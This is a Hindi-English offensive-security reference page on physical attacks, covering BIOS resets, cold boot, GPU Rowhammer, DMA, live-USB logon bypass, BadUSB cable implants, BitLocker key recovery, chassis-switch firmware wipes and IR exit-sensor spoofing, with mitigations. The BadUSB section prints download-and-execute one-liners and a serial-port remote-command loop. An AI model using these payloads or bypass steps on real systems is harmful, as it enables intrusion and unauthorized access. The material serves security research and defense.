# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

Legacy PC firmware settings को CMOS battery disconnect करके या documented clear-CMOS jumper का उपयोग करके reset किया जा सकता है। आवश्यक power-off समय board-specific होता है, और modern UEFI passwords या keys nonvolatile flash, embedded controller या security device में मौजूद हो सकते हैं; इसलिए वे battery removal के बाद भी सुरक्षित रह सकते हैं। Pins को short करने से पहले board/service manual देखें; यह प्रक्रिया TPM measurements को भी invalidate कर सकती है और disk-encryption recovery trigger कर सकती है।

Legacy x86 systems पर, **killCMOS** और **CmosPwd** जैसे tools bootable environment से CMOS-backed settings को inspect या alter कर सकते हैं। CmosPwd पुराने BIOS families के एक documented set के password formats को पहचानता है और CMOS state को back up, restore या erase/kill कर सकता है; इसके published builds legacy DOS/Windows, Linux, FreeBSD और NetBSD environments को target करते हैं।<sup>[[18]](#references)</sup> ये utilities generic UEFI password removers नहीं हैं और इनके लिए पर्याप्त hardware/firmware access आवश्यक है।

कुछ laptop firmware में कई असफल password attempts के बाद vendor-specific challenge code दिखाई देता है। [bios-pw.org](https://bios-pw.org) जैसे databases कुछ models के लिए legacy vendor recovery passwords derive कर सकते हैं, लेकिन कई systems ऐसा lockout लागू करते हैं जिसमें कोई derivable challenge नहीं होता। किसी भी generated password को model-specific मानें और permanent attempt counters को समाप्त करने से बचें।

### UEFI Security

Modern **UEFI** systems के लिए, CHIPSEC Secure Boot variable protections का audit कर सकता है। नीचे दिया गया non-modifying check पहले चलाएँ; optional `-a modify` mode variables को जानबूझकर corrupt करने का प्रयास करता है और इसका उपयोग केवल ऐसे recoverable lab system पर किया जाना चाहिए। CHIPSEC स्वयं चेतावनी देता है कि इसका privileged driver और low-level hardware access production endpoints के लिए unsuitable हैं।<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM Analysis और Cold Boot Attacks

DRAM refresh रुकने पर हर bit तुरंत समाप्त नहीं होती। Decay rate module technology और temperature के अनुसार काफी बदलती है; cooling, बिना ठंडा किए गए power cycle की तुलना में उपयोगी data को बहुत अधिक समय तक सुरक्षित रख सकती है। Cold-boot attack तेजी से किसी छोटे acquisition environment में reboot करता है या ठंडे किए गए module को transfer करता है, raw memory capture करता है और bit decay के बावजूद cryptographic keys को reconstruct करता है। Disk-copy utility अपने-आप physical-memory imager नहीं होती, और Volatility capture का analysis करता है, उसे acquire नहीं करता; platform के अनुरूप validated acquisition tool का उपयोग करें।<sup>[[12]](#references)</sup>

---

## Page Tables के विरुद्ध GPU Rowhammer

आधुनिक GPU Rowhammer attacks तब अधिक उपयोगी हो जाते हैं जब वे ordinary buffers के बजाय **GPU virtual-memory metadata** को target करते हैं। **GDDR6 NVIDIA Ampere GPUs** पर हालिया research से पता चलता है कि unprivileged CUDA code चलाने वाला attacker GPU-specific hammering patterns बना सकता है, vulnerable rows में paging structures रखने के लिए **memory massaging** का उपयोग कर सकता है, और फिर **last-level page table** या किसी intermediate **page directory** में bits flip कर सकता है। एक translation entry corrupt होने के बाद attacker **arbitrary GPU memory read/write** प्राप्त कर सकता है और फिर host compromise की ओर pivot कर सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 में **hammerable rows** को profile करें और refresh-aware / non-uniform hammering patterns बनाएं, जो in-DRAM mitigations को bypass करें।
2. **GPU allocations को massage** करें ताकि driver page-translation structures को default protected pool में रखने के बजाय hammerable physical locations में रखे। व्यवहार में इसका अर्थ low-memory page-table region को exhaust करना और controlled strides के साथ large sparse UVM mappings को spray करना हो सकता है।
3. **PFN** या aperture-related bits जैसे **translation metadata** को page-table / page-directory entry के अंदर flip करें, ताकि attacker-controlled virtual page page-table pages, arbitrary GPU memory या host-visible system mappings पर resolve हो।
4. forged mapping का पुन: उपयोग करके अतिरिक्त translation entries को rewrite करें और GPU contexts के बीच **arbitrary GPU memory read/write** तक escalate करें।

### Host Pivot और Mitigations

- **IOMMU disabled** होने पर forged system-aperture mappings GPU के सामने arbitrary **host physical memory** expose कर सकते हैं, जिससे GPU primitive full host compromise में बदल जाता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** last-level page-table entries को target करता है, जबकि **GeForge** दिखाता है कि page-directory level को corrupt करना आसान हो सकता है, क्योंकि एक bit flip बड़े translation subtree को retarget कर सकता है। केवल एक paging layer को security-critical न मानें।<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** अभी भी महत्वपूर्ण है, क्योंकि यह GDDRHammer/GeForge द्वारा उपयोग किए जाने वाले direct arbitrary-host-memory path को block करता है, लेकिन यह **complete mitigation** नहीं है। **GPUBreach** दूसरा-stage pivot दिखाता है, जिसमें attacker GPU-writable, driver-owned CPU buffers को corrupt करता है और फिर NVIDIA driver memory-safety bugs trigger करके kernel write primitive तथा **root shell** प्राप्त करता है, यहां तक कि IOMMU enabled होने पर भी।<sup>[[3]](#references)</sup>
- Supported workstation/server GPUs पर **system-level ECC** एक practical hardening step है। ECC के बिना consumer GPUs कमजोर defense surface expose करते हैं।<sup>[[4]](#references)</sup>
- ये attacks केवल theoretical नहीं हैं: **GeForge** ने RTX 3060 पर **1,171** और RTX A6000 पर **202** bit flips report किए, जो working host-privilege-escalation chain बनाने के लिए पर्याप्त थे।<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**Inception** FireWire और शुरुआती Thunderbolt configurations जैसे interfaces पर **DMA-based memory acquisition and patching** प्रदर्शित करता है, जिसमें historical login-bypass signatures भी शामिल हैं। यह केवल “Windows 10 के विरुद्ध ineffective” नहीं है: exploitability interface, target build, IOMMU policy, lock state और Windows Kernel DMA Protection के supported तथा enabled होने पर निर्भर करती है। Windows 10 version 1803 और बाद के versions ने compatible platforms पर Kernel DMA Protection introduce किया, जिससे attack surface में substantial बदलाव आया।<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access के लिए Live CD/USB

किसी unencrypted या पहले से unlocked Windows volume पर offline environment **sethc.exe** या **Utilman.exe** जैसी accessibility binaries को **cmd.exe** से replace कर सकता है, जिससे संबंधित logon-screen shortcut चलने पर SYSTEM command prompt मिलता है। **chntpw** जैसे tools local SAM account data को edit कर सकते हैं। ये methods locked BitLocker volume को bypass नहीं करते और DPAPI/EFS से protected credentials को damage कर सकते हैं; forensic copies और backups सुरक्षित रखें।

**Kon-Boot** supported Windows/macOS configurations के लिए commercial boot-time authentication-bypass tool है। Compatibility OS, firmware mode, Secure Boot और disk-encryption setup पर निर्भर करती है; यह BitLocker-locked volume को decrypt नहीं करता।<sup>[[10]](#references)</sup>

---

## Windows Security Features को Handle करना

### Boot और Recovery Shortcuts

- **Delete/Supr**, F2, F10 या कोई अन्य vendor key firmware setup खोल सकती है।
- **F8** केवल उन configurations पर legacy Windows advanced boot options में प्रवेश करता है जहां वह path enabled रहता है; वर्तमान recovery entry अलग-अलग हो सकती है।
- **Shift** दबाकर रखने से कुछ configurations में Windows automatic logon suppress हो सकता है, हालांकि policy/registry settings इस behavior को disable कर सकती हैं।<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** और Teensy boards जैसे devices trusted HID keyboards के रूप में enumerate होकर predefined keystrokes inject कर सकते हैं। Payload को शुरुआत में logged-on session के privileges और desktop access प्राप्त होते हैं; UAC prompts, screen locking, keyboard layout, timing और endpoint USB policy अभी भी इसे सीमित करते हैं।<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator या backup privileges वाला व्यक्ति shadow copy create कर सकता है या registry hives save कर सकता है, ताकि **SAM** और **SYSTEM** जैसी locked files acquire की जा सकें। यह post-compromise collection technique है, privilege bypass नहीं, और इसे `diskshadow`/VSS तथा registry-hive export events के साथ correlate किया जाना चाहिए।

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 आधारित implants जैसे **Evil Crow Cable Wind**, USB-A→USB-C या USB-C↔USB-C cables के अंदर छिपे रहते हैं, केवल USB keyboard के रूप में enumerate होते हैं और अपना C2 stack Wi-Fi पर expose करते हैं। Operator को केवल victim host से cable को power देना, `Evil Crow Cable Wind` नाम और `123456789` password वाला hotspot बनाना और embedded HTTP interface तक पहुंचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या उसके DHCP address) पर browse करना होता है।<sup>[[8]](#references)</sup>
- Browser UI में *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* और *Config* के tabs होते हैं। Stored payloads को per OS tag किया जाता है, keyboard layouts को on the fly switch किया जा सकता है और VID/PID strings को known peripherals की नकल करने के लिए बदला जा सकता है।
- C2 cable के अंदर रहने के कारण phone payloads stage कर सकता है, execution trigger कर सकता है और organization के network का उपयोग किए बिना Wi-Fi credentials manage कर सकता है—short dwell-time physical intrusions के लिए उपयोगी।

### OS-aware AutoExec payloads

- AutoExec rules एक या अधिक payloads को USB enumeration के तुरंत बाद fire करने के लिए bind करते हैं। Implant lightweight OS fingerprinting करता है और matching script select करता है।
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) या `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Execution unattended होने के कारण, केवल charging cable बदलने से logged-on user context के अंतर्गत “plug-and-pwn” initial access प्राप्त किया जा सकता है।

### Wi-Fi TCP पर HID-bootstrapped remote shell

1. **Keystroke bootstrap:** Stored payload एक console खोलता है और एक ऐसा loop paste करता है जो नए USB serial device पर आने वाली हर चीज को execute करता है। एक minimal Windows variant है:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant USB CDC channel को open रखता है, जबकि उसका ESP32-S3 operator को वापस TCP client (Python script, Android APK या desktop executable) लॉन्च करता है। TCP session में type किए गए bytes serial loop में forward किए जाते हैं, जिससे air-gapped hosts पर भी remote command execution संभव होता है। Output सीमित होता है, इसलिए operators आमतौर पर blind commands (account creation, additional tooling की staging आदि) चलाते हैं।

### HTTP OTA update surface

- Documented Evil Crow Cable Wind interface `/update` पर unauthenticated firmware-update endpoint expose करता है:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators engagement के बीच features को hot-swap कर सकते हैं (जैसे, flash USB Army Knife firmware), बिना cable खोले, जिससे implant target host में plugged-in रहते हुए भी नई capabilities पर pivot कर सकता है।

## BitLocker Encryption को Bypass करना

Live या हाल ही में चल रहे system का authorized forensic acquisition, volume unlocked होने के दौरान BitLocker volume master key या संबंधित key material रख सकता है। Elcomsoft Forensic Disk Decryptor और Passware Kit Forensic जैसे commercial tools supported memory images, hibernation files या crash dumps को search कर सकते हैं, लेकिन सफलता की गारंटी नहीं है। Modern Windows crash dumps को भी encrypt करता है जब BitLocker enabled हो, और stored 48-digit recovery password in-memory volume key से अलग artifact है।<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key जोड़ने के लिए Social Engineering

ऐसा attacker जो किसी administrator को BitLocker-management commands चलाने के लिए राजी कर ले, recovery-password, external-key या कोई अन्य protector जोड़ सकता है और फिर उसे capture कर सकता है। Recovery password मनमाने zeros वाले string की तरह नहीं हो सकता: BitLocker numerical recovery passwords का validated 48-digit format होता है। संबंधित authorized-administration syntax `manage-bde -protectors -add C: -recoverypassword` है; resulting protectors को `manage-bde -protectors -get C:` से list करें। Protector additions को monitor करें और सुनिश्चित करें कि नया recovery material केवल approved locations में escrowed हो।<sup>[[16]](#references)</sup>

---

## BIOS को Factory-Reset करने के लिए Chassis Intrusion / Maintenance Switches का Exploitation

कई modern laptops और small-form-factor desktops में **chassis-intrusion switch** शामिल होता है, जिसे Embedded Controller (EC) और BIOS/UEFI firmware monitor करते हैं। जबकि switch का primary purpose device खोले जाने पर alert उठाना है, vendors कभी-कभी एक **undocumented recovery shortcut** implement करते हैं, जो switch को किसी specific pattern में toggle करने पर trigger होता है।<sup>[[5]](#references)[[6]](#references)</sup>

### Attack कैसे काम करता है

1. Switch EC पर एक **GPIO interrupt** से wired होता है।
2. EC पर चल रहा firmware **presses के timing और number** को track करता है।
3. जब hard-coded pattern recognise होता है, EC एक *mainboard-reset* routine invoke करता है, जो **system NVRAM/CMOS के contents को erase** करता है।
4. अगली boot पर, प्रभावित models reset firmware state load करते हैं। Vendor और revision के आधार पर, cleared state में supervisor password, custom boot settings या enrolled Secure Boot keys शामिल हो सकती हैं; TPM state और disk-encryption effects का अलग से assessment करना आवश्यक है।

> Firmware reset external-boot options restore कर सकता है, लेकिन यह storage को **decrypt** नहीं करता। BitLocker या कोई अन्य full-disk encryption system TPM/firmware changes के बाद recovery में जा सकता है और recovery key के बिना internal drive को सुरक्षित रख सकता है।<sup>[[16]](#references)</sup>

### Real-World Example – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) का recovery shortcut है:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
दसवें cycle के बाद EC एक flag सेट करता है, जो BIOS को अगले reboot पर NVRAM wipe करने का निर्देश देता है। पूरी प्रक्रिया में लगभग 40 s लगते हैं और इसके लिए **सिर्फ एक screwdriver** की आवश्यकता होती है।<sup>[[5]](#references)</sup>

### सामान्य Exploitation Procedure

1. Target को power-on करें या suspend-resume करें, ताकि EC चल रहा हो।
2. Intrusion/maintenance switch तक पहुंचने के लिए bottom cover हटाएं।
3. Vendor-specific toggle pattern दोहराएं (documentation, forums देखें या EC firmware को reverse-engineer करें)।
4. Device को फिर से assemble करके reboot करें, फिर जांचें कि वास्तव में कौन-सी firmware settings और credentials बदली हैं।
5. यदि authorization प्राप्त है और external boot उपलब्ध है, तो एक नियंत्रित live image से boot करें। जब कोई internal volume वैध रूप से unlocked हो (या वह कभी encrypted न रहा हो), तो live environment credentials और data प्राप्त कर सकता है या EFI System Partition की जांच कर सकता है। EFI implant install करने के लिए उस partition को modify करना persistent और अत्यधिक intrusive है, तथा Secure Boot, measured boot, firmware write protection और endpoint monitoring से सीमित रहता है। Encrypted storage अपनी key या recovery material के बिना inaccessible रहता है।

### Detection & Mitigation

* OS management console में chassis-intrusion events log करें और उन्हें अनपेक्षित BIOS resets के साथ correlate करें।
* Opening का पता लगाने के लिए screws/covers पर **tamper-evident seals** लगाएं।
* Devices को **physically controlled areas** में रखें; मानकर चलें कि physical access का अर्थ full compromise है।
* जहां उपलब्ध हो, vendor के “maintenance switch reset” feature को disable करें या NVRAM resets के लिए अतिरिक्त cryptographic authorisation आवश्यक बनाएं।

---

## No-Touch Exit Sensors के विरुद्ध Covert IR Injection

### Sensor Characteristics
- Commodity “wave-to-exit” sensors एक near-IR LED emitter को TV-remote शैली के receiver module के साथ pair करते हैं, जो सही carrier (≈30 kHz) के कई pulses (~4–10) देखने के बाद ही logic high report करता है।<sup>[[7]](#references)</sup>
- एक plastic shroud emitter और receiver को एक-दूसरे की ओर सीधे देखने से रोकता है, इसलिए controller मानता है कि कोई भी validated carrier पास के reflection से आया है और door strike खोलने वाला relay drive करता है।
- एक बार controller को target की उपस्थिति का विश्वास हो जाने पर वह अक्सर outbound modulation envelope बदल देता है, लेकिन receiver filtered carrier से मेल खाने वाले किसी भी burst को स्वीकार करता रहता है।

### Attack Workflow
1. **Emission profile capture करें** – controller pins के across logic analyser लगाकर internal IR LED को drive करने वाले pre-detection और post-detection दोनों waveforms record करें।
2. **केवल “post-detection” waveform replay करें** – stock emitter को हटाएं या ignore करें और external IR LED को शुरुआत से ही पहले से triggered pattern के साथ drive करें। क्योंकि receiver केवल pulse count/frequency पर ध्यान देता है, वह spoofed carrier को genuine reflection मानकर relay line assert कर देता है।
3. **Transmission को gate करें** – carrier को tuned bursts में transmit करें (जैसे, tens of milliseconds on और लगभग उतने ही समय off), ताकि receiver के AGC या interference handling logic को saturate किए बिना minimum pulse count दिया जा सके। Continuous emission sensor को जल्दी desensitise कर देती है और relay firing रुक जाती है।

### Long-Range Reflective Injection
- Bench LED को high-power IR diode, MOSFET driver और focusing optics से बदलने पर लगभग 6 m दूर से reliable triggering संभव हो जाती है।
- Attacker को receiver aperture के लिए line-of-sight की आवश्यकता नहीं होती; glass के माध्यम से दिखाई देने वाली interior walls, shelving या door frames पर beam aim करने से reflected energy receiver के लगभग 30° field of view में प्रवेश कर सकती है और close-range hand wave का अनुकरण कर सकती है।
- चूंकि receivers केवल weak reflections की अपेक्षा करते हैं, इसलिए कहीं अधिक मजबूत external beam कई surfaces से bounce होकर भी detection threshold से ऊपर रह सकती है।

### Weaponised Attack Torch
- Driver को commercial flashlight के अंदर embed करने से tool plain sight में छिप जाता है। Visible LED को receiver के band से matched high-power IR LED से बदलें, ≈30 kHz bursts generate करने के लिए ATtiny412 (या समान MCU) जोड़ें और LED current sink करने के लिए MOSFET का उपयोग करें।
- Telescopic zoom lens range/precision के लिए beam को संकीर्ण करता है, जबकि MCU control के अंतर्गत vibration motor visible light emit किए बिना modulation active होने की haptic confirmation देता है।
- कई stored modulation patterns (थोड़ी अलग carrier frequencies और envelopes) के बीच cycle करने से rebranded sensor families के साथ compatibility बढ़ती है। इससे operator reflective surfaces को sweep कर सकता है, जब तक relay के click की आवाज न सुनाई दे और door release न हो जाए।

---

## References

- [1] [GDDRHammer: DRAM Rows को अत्यधिक disturb करना — Modern GPUs से Cross-Component Rowhammer Attacks](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Fun और Profit के लिए GDDR Memory को hammer करके GPU Page Tables forge करना](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer का उपयोग करके GPUs पर Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. यहां दबाकर pwn करें”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Covert IR Torch से IR No-Touch Exit Sensors को bypass करना”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind के साथ hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chips के विरुद्ध Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation और compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Keys पर Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA के माध्यम से physical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift दबाने और automatic logon behavior के बारे में](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation और downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
